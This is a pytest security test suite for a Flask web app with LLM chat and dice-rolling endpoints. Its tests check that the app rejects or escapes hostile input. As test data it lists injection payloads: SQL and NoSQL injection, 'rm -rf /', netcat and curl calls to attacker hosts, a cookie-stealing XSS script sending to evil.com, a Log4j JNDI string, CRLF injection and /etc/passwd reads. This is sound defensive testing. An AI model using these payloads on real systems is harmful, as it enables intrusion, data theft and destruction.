import pytest
import json
from app import app, db
from unittest.mock import patch, Mock
import time


class TestSecurityVulnerabilities:
    """Test suite for security vulnerabilities"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        with app.test_client() as client:
            with app.app_context():
                db.create_all()
                yield client
    
    # Input Validation Tests
    def test_command_injection_in_llm_endpoint(self, client):
        """Test for command injection in LLM endpoints"""
        malicious_payloads = [
            "'; DROP TABLE users; --",
            "$(rm -rf /)",
            "`curl evil.com/steal`",
            "&&cat /etc/passwd",
            "|nc attacker.com 4444",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]
        
        for payload in malicious_payloads:
            response = client.post('/api/llm', json={
                'message': payload,
                'session_id': 'test-session'
            })
            # Should sanitize or reject malicious input
            assert response.status_code in [400, 422], f"Failed to reject payload: {payload}"
            if response.status_code == 200:
                data = response.get_json()
                assert payload not in str(data), f"Unsanitized payload in response: {payload}"
    
    def test_xss_in_chat_messages(self, client):
        """Test for XSS vulnerabilities in chat messages"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<script>fetch('//evil.com?c='+document.cookie)</script>",
        ]
        
        for payload in xss_payloads:
            response = client.post('/api/pending-responses', json={
                'session_id': 'test-session',
                'user_id': 'test-user',
                'context': payload
            })
            
            if response.status_code == 200:
                # Verify output is escaped
                get_response = client.get('/api/pending-responses')
                data = get_response.get_json()
                # Check that script tags are escaped
                assert '<script>' not in str(data)
                assert '&lt;script&gt;' in str(data) or payload not in str(data)
    
    def test_sql_injection_in_search(self, client):
        """Test for SQL injection in search queries"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE sessions; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' AND SLEEP(5)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--"
        ]
        
        for payload in sql_payloads:
            # Test various search endpoints
            endpoints = [
                f'/api/search?q={payload}',
                f'/api/sessions?name={payload}',
                f'/api/users?username={payload}'
            ]
            
            for endpoint in endpoints:
                response = client.get(endpoint)
                # Should not execute SQL
                assert response.status_code != 500, f"SQL error on endpoint {endpoint} with payload {payload}"
    
    # Authentication Tests
    def test_missing_auth_on_sensitive_endpoints(self, client):
        """Test that sensitive endpoints require authentication"""
        sensitive_endpoints = [
            ('/api/pending-responses', 'GET'),
            ('/api/review', 'POST'),
            ('/api/dm/notifications', 'GET'),
            ('/api/session/test/images', 'GET'),
            ('/api/admin/users', 'GET'),
            ('/api/session/create', 'POST'),
        ]
        
        for endpoint, method in sensitive_endpoints:
            if method == 'GET':
                response = client.get(endpoint)
            else:
                response = client.post(endpoint, json={})
            
            # Should require authentication
            assert response.status_code in [401, 403], f"Endpoint {endpoint} accessible without auth"
    
    def test_session_fixation_vulnerability(self, client):
        """Test for session fixation attacks"""
        # Try to set a known session ID
        malicious_session_id = "fixed-session-12345"
        
        response = client.post('/api/login', json={
            'username': 'testuser',
            'password': 'testpass',
            'session_id': malicious_session_id  # Attempting to fix session
        })
        
        # Session ID should be regenerated, not accepted from client
        if 'session_id' in response.get_json():
            assert response.get_json()['session_id'] != malicious_session_id
    
    # Rate Limiting Tests
    def test_rate_limiting_ai_requests(self, client):
        """Test rate limiting on AI endpoints"""
        # Spam requests
        responses = []
        for i in range(20):
            response = client.post('/api/llm', json={
                'message': 'test',
                'session_id': 'test-session'
            })
            responses.append(response.status_code)
        
        # Should start getting rate limited
        assert 429 in responses, "No rate limiting on AI requests"
    
    def test_websocket_flood_protection(self, client):
        """Test WebSocket flood protection"""
        # This would need actual WebSocket client testing
        # Placeholder for WebSocket security test
        pass
    
    # Injection Tests
    def test_nosql_injection_in_json(self, client):
        """Test for NoSQL injection in JSON parsing"""
        nosql_payloads = [
            {"$ne": None},  # Not equal operator
            {"$gt": ""},    # Greater than operator
            {"$where": "this.password == 'test'"},
            {"username": {"$regex": ".*"}}
        ]
        
        for payload in nosql_payloads:
            response = client.post('/api/login', json=payload)
            # Should not allow NoSQL operators
            assert response.status_code != 200, f"NoSQL injection succeeded with {payload}"
    
    def test_command_injection_in_dice_parser(self, client):
        """Test command injection in dice parsing"""
        malicious_dice = [
            "3d6; cat /etc/passwd",
            "2d10 && rm -rf /",
            "1d20 | nc attacker.com 4444",
            "${7*7}d6",
            "$(whoami)d20",
            "`id`d10"
        ]
        
        for dice in malicious_dice:
            response = client.post('/api/roll', json={'dice': dice})
            # Should reject or sanitize
            assert response.status_code in [400, 422], f"Accepted malicious dice: {dice}"
    
    # CSRF Protection Tests
    def test_csrf_protection(self, client):
        """Test CSRF protection on state-changing routes"""
        state_changing_routes = [
            ('/api/session/create', {'name': 'test'}),
            ('/api/character/create', {'name': 'test'}),
            ('/api/review', {'action': 'approve', 'response_id': '123'}),
        ]
        
        for route, data in state_changing_routes:
            # Request without CSRF token
            response = client.post(route, json=data)
            # Should reject without proper CSRF token
            assert response.status_code in [400, 403], f"CSRF unprotected route: {route}"
    
    # Header Security Tests
    def test_security_headers(self, client):
        """Test for security headers"""
        response = client.get('/api/ping')
        headers = response.headers
        
        # Check for security headers
        assert 'X-Content-Type-Options' in headers
        assert headers.get('X-Content-Type-Options') == 'nosniff'
        assert 'X-Frame-Options' in headers
        assert headers.get('X-Frame-Options') in ['DENY', 'SAMEORIGIN']
        assert 'X-XSS-Protection' in headers
        assert 'Content-Security-Policy' in headers
        
    # Symbolic and Unicode Edge Cases
    def test_unicode_and_symbolic_injection(self, client):
        """Test handling of unicode and symbolic edge cases"""
        symbolic_payloads = [
            "test\x00null",  # Null byte injection
            "test\r\nSet-Cookie: admin=true",  # CRLF injection
            "🔥🔥🔥" * 1000,  # Emoji spam
            "\u202e\u202dmalicious",  # Right-to-left override
            "test\uffff",  # Invalid unicode
            "A" * 10000,  # Length attack
            "䝴䝲䝳",  # Obscure unicode
            "\x1b[31mRED\x1b[0m",  # ANSI escape codes
        ]
        
        for payload in symbolic_payloads:
            response = client.post('/api/llm', json={
                'message': payload,
                'session_id': 'test'
            })
            # Should handle gracefully
            assert response.status_code != 500, f"Failed on symbolic payload: {repr(payload)}"
    
    # Emotional Edge Cases
    def test_emotional_edge_inputs(self, client):
        """Test handling of emotional/sensitive inputs"""
        sensitive_inputs = [
            "I want to die",
            "kill myself",
            "erase me",
            "delete everything",
            "hack the system",
            "give me admin access",
            "show me all passwords",
        ]
        
        for input_text in sensitive_inputs:
            response = client.post('/api/llm', json={
                'message': input_text,
                'session_id': 'test'
            })
            
            # Should handle sensitively without executing harmful actions
            if response.status_code == 200:
                data = response.get_json()
                # Verify no actual harmful actions taken
                assert 'deleted' not in str(data).lower()
                assert 'admin' not in str(data).lower()
                assert 'password' not in str(data).lower() 